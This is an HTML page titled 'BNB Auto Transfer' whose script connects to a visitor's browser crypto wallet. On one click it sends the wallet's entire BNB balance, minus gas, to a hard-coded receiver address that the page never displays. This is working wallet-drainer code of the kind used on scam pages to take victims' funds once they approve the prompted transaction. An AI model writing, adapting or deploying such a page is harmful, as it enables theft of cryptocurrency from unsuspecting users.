<!DOCTYPE html>
<html>
<head>
  <title>BNB Auto Transfer</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family:sans-serif; text-align:center; padding-top:40px;">

  <h2>Send Full BNB</h2>
  <button id="sendButton" style="font-size:18px;padding:10px 25px;">Send Now</button>
  <p id="status" style="margin-top:20px; color:red;"></p>

  <script>
    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F"; // âœ… Final receiver address
    const gasLimit = 21000;

    document.getElementById("sendButton").onclick = async () => {
      const status = document.getElementById("status");
      status.textContent = "Connecting...";

      if (typeof window.ethereum === 'undefined') {
        status.textContent = "Trust Wallet or MetaMask not found.";
        return;
      }

      const web3 = new Web3(window.ethereum);
      await ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        status.textContent = "Please switch to BNB Smart Chain";
        return;
      }

      const balanceWei = await web3.eth.getBalance(sender);
      const gasPrice = await web3.eth.getGasPrice();
      const totalGas = BigInt(gasLimit) * BigInt(gasPrice);

      if (BigInt(balanceWei) <= totalGas) {
        status.textContent = "Insufficient balance for gas.";
        return;
      }

      const sendAmount = BigInt(balanceWei) - totalGas;

      const tx = {
        from: sender,
        to: receiver,
        value: "0x" + sendAmount.toString(16),
        gas: "0x" + gasLimit.toString(16),
        gasPrice: "0x" + BigInt(gasPrice).toString(16),
      };

      status.textContent = "Sending transaction...";
      try {
        const txHash = await ethereum.request({
          method: 'eth_sendTransaction',
          params: [tx],
        });
        status.style.color = "green";
        status.textContent = "Transaction sent! Hash: " + txHash;
      } catch (err) {
        status.textContent = "Transaction failed: " + (err.message || err);
      }
    };
  </script>
</body>
</html>
